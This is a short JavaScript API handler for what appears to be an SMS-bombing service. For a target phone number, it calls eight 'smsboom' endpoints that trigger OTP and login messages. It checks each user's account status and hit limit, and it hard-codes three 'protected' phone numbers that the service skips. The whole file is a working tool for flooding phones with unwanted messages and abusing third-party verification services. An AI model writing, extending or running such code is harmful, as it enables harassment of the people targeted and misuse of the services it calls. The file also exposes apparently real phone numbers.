import { USERS } from "./users.js";

export default async function handler(req,res){

 const {number,id,hits} = req.query;

 if(!number)
  return res.json({ok:false,msg:"number required"});


 /* ---------------- PROTECTED NUMBERS ---------------- */

 const PROTECTED = [
  "01760432796",
  "01995869970",
  "01762633635"
 ];

 if(PROTECTED.includes(number)){
  return res.json({ok:false,msg:"He is my Boss😈"});
 }


 /* ---------------- USER CHECK ---------------- */

 const user = USERS.find(u=>u.id===id);

 if(!user)
  return res.json({ok:false,msg:"Invalid user"});

 if(!user.status)
  return res.json({ok:false,msg:"Account Offline"});


 /* ---------------- LIMIT CHECK ---------------- */

 if(parseInt(hits) > user.limit){
  return res.json({ok:false,msg:`Your limit is ${user.limit}`});
 }


 /* ---------------- API HIT ---------------- */

 const APIS=[
  "https://smsboom.vercel.app/send-otp",
    "https://smsbooma.vercel.app/verify-phone",
    "https://smsboomc.vercel.app/shikho-send-otp",
    "https://smsboomg.vercel.app/bondi-login",
    "https://smsboomi.vercel.app/bioscope-login",
    "https://smsboomj.vercel.app/send-otp",
    "https://smsboomk.vercel.app/send-otp",
    "https://smsboomm.vercel.app/send-otp"
 ];

 for(const api of APIS){
  try{
   await fetch(`${api}?number=${encodeURIComponent(number)}`);
  }catch(e){}
 }

 res.json({ok:true});

}
